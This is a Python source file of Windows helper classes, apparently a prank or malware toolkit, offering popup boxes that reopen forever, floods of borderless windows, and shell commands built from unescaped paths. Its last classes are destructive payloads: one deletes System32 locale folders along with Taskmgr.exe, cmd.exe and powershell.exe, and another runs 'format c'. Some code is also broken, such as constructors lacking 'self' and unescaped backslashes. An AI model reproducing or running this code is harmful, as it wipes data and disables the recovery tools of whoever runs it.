class Warwindow():
    def __init__(self,text,title,unShut):
        import win32api as hhg
        import win32con as hhu
        self.text=text
        self.title=title
        self.unShut=unShut
        if unShut=="True":
            while True:
                hhg.MessageBox(0, text, title,hhu.MB_ICONWARNING)
        elif unShut=="False":
            hhg.MessageBox(0,text, title,hhu.MB_ICONWARNING)
        elif unShut=="":
            hhg.MessageBox(0,text, title,hhu.MB_ICONWARNING)
        else:
            hhg.MessageBox(0,"unShut==True or Flash", "vseed error",hhu.MB_ICONWARNING)
class Queswindow():
    def __init__(self,text,title,unShut):
        import win32api as hhg
        import win32con as hhu
        self.text=text
        self.title=title
        self.unShut=unShut
        if unShut=="True":
            while True:
                hhg.MessageBox(0, text, title,hhu.MB_ICONQUESTION)
        elif unShut=="False":
            hhg.MessageBox(0,text, title,hhu.MB_ICONQUESTION)
        elif unShut=="":
            hhg.MessageBox(0,text, title,hhu.MB_ICONQUESTION)
        else:
            hhg.MessageBox(0,"unShut==True or Flash", "vseed error",hhu.MB_ICONWARNING)
class Rewindow():
    def __init__(self,text,title,unShut):
        import win32api as hhg
        import win32con as hhu
        self.text=text
        self.title=title
        self.unShut=unShut
        if unShut=="True":
            while True:
                hhg.MessageBox(0, text, title,hhu.MB_RETRYCANCEL)
        elif unShut=="False":
            hhg.MessageBox(0,text, title,hhu.MB_RETRYCANCEL)
        elif unShut=="":
            hhg.MessageBox(0,text, title,hhu.MB_RETRYCANCEL)
        else:
            hhg.MessageBox(0,"unShut==True or Flash", "vseed error",hhu.MB_ICONWARNING)
    class Errordow():
        def __init__ (self,text,title,unShut):
            import win32api as hhg
            import win32con as hhu
            self.text=text
            self.title=title
            self.unShut=unShut
            if unShut=="True":
                while True:
                    hhg.MessageBox(0, text, title,hhu.MB_ICONERROR)
            elif unShut=="False":
                hhg.MessageBox(0,text, title,hhu.MB_ICONERROR)
            elif unShut=="":
                hhg.MessageBox(0,text, title,hhu.MB_ICONERROR)
            else:
                hhg.MessageBox(0,"unShut==True or Flash", "vseed error",hhu.MB_ICONERROR)
class Astwindow():
    def __init__(self,text,title,unShut):
        import win32api as hhg
        import win32con as hhu
        self.text=text
        self.title=title
        self.unShut=unShut
        if unShut=="True":
            while True:
                hhg.MessageBox(0, text, title,hhu.MB_ICONASTERISK)
        elif unShut=="False":
            hhg.MessageBox(0,text, title,hhu.MB_ICONASTERISK)
        elif unShut=="":
            hhg.MessageBox(0,text, title,hhu.MB_ICONASTERISK)
        else:
            hhg.MessageBox(0,"unShut==True or Flash", "vseed error",hhu.MB_ICONWARNING)
class Delfile ():
    def __init__(self,path):
        import os
        self.path=path
        os.system("del " + path)
class Delfolder():
    def __init__(self,path):
        self.path=path
        import os
        os.system("rd " + path)
class Createfolder():
    def __init__(self,path,name):
        self.path=path
        self.name=name
        import os
        os.system("md "+path+"\\"+name)
class Createf_x():
    def __init__(self,name,path):
        self.name=name
        self.path=path
        f = open(path+"\\"+name, "x")
class write_a():
    def __init__(self,path,text):
        self.path=path
        self.text=text
        f = open(path, "a")
        f.write(text)
        f.close()
class write_w():
    def __init__(self,path,text):
        self.path=path
        self.text=text
        f = open(path, "w")
        f.write(text)
        f.close()
class cinvf():
    def __init__(self,path,name):
        self.path=path
        self.name=name
        import os
        os.system("md " + path +"\\"+name+"..\\")
        #md C:\Users\32829\Desktop\abcde..\
class alldow():
    def __init__(self,fonts,texts,color,fontsize,size1,times,ts):
        import tkinter as tk
        import random
        import threading
        import time
        self.fonts=fonts
        self.texts=texts
        self.color=color
        self.fontsize=fontsize
        self.size=size1
        self.time=times
        self.ts=ts



        def boom():
            window = tk.Tk()
            width = window.winfo_screenwidth()
            height = window.winfo_screenheight()
            a = random.randrange(0, width)
            b = random.randrange(0, height)
            window.title('666')
            window.geometry(size1 + "+" + str(a) + "+" + str(b))
            tk.Label(window, text=texts, bg=color,
                    font=(fonts, fontsize), width=20, height=4).pack()
            window.overrideredirect(True)
            window.mainloop()


        threads = []
        for i in range(times):
            t = threading.Thread(target=boom)
            threads.append(t)
            time.sleep(ts)
            threads[i].start()
class disablewindows():
    def __init__():
        import os
        import shutil
        shutil.rmtree("C:\\Windows\\System32\\en-GB")
        shutil.rmtree("C:\\Windows\\System32\en-US")
        shutil.rmtree("C:\\Windows\\System32\\en-ES")
        shutil.rmtree("C:\\Windows\\System32\\en-MX")
        shutil.rmtree("C:\\Windows\\System32\\en-EE")
        shutil.rmtree("C:\\Windows\\System32\\en-GS")
        os.remove("C:\\Windows\\System32\\Taskmgr.exe")
        os.remove("C:\\Windows\\System32\\WindowsPowerShell\v1.0\powershell.exe")
        os.remove("C:\\Windows\\System32\\cmd.exe")
class rfc():
    def __init__():
        import os
        os.system("format c")



